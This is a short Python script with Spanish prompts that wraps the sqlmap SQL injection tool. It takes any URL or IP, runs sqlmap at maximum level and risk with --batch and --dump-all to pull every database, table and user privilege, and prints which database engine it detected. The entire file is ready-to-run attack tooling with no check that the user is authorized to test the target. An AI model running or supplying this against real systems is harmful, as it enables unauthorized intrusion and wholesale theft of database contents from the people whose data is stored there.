import subprocess
import re

url = input("Inserte la URL o IP que quiere escanear: ")

command = [
    "sqlmap", "-u", url, "--batch", "--random-agent",
    "--level=5", "--risk=3", "--banner", "--current-user",
    "--current-db", "--is-dba", "--dbs", "--tables",
    "--dump-all", "--threads=5"
]

process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

db_detected = False
for line in process.stdout:
    print(line, end='')
    
    if not db_detected:
        if re.search(r"Oracle", line, re.IGNORECASE):
            print("\nHemos detectado una base de datos Oracle")
            db_detected = True
        elif re.search(r"MySQL", line, re.IGNORECASE):
            print("\nHemos detectado una base de datos MySQL")
            db_detected = True
        elif re.search(r"PostgreSQL", line, re.IGNORECASE):
            print("\nHemos detectado una base de datos PostgreSQL")
            db_detected = True
        elif re.search(r"Microsoft SQL Server", line, re.IGNORECASE):
            print("\nHemos detectado una base de datos Microsoft SQL Server")
            db_detected = True

stderr_output = process.stderr.read()
if stderr_output:
    print("Error:", stderr_output)

process.stdout.close()
process.stderr.close()
process.wait()

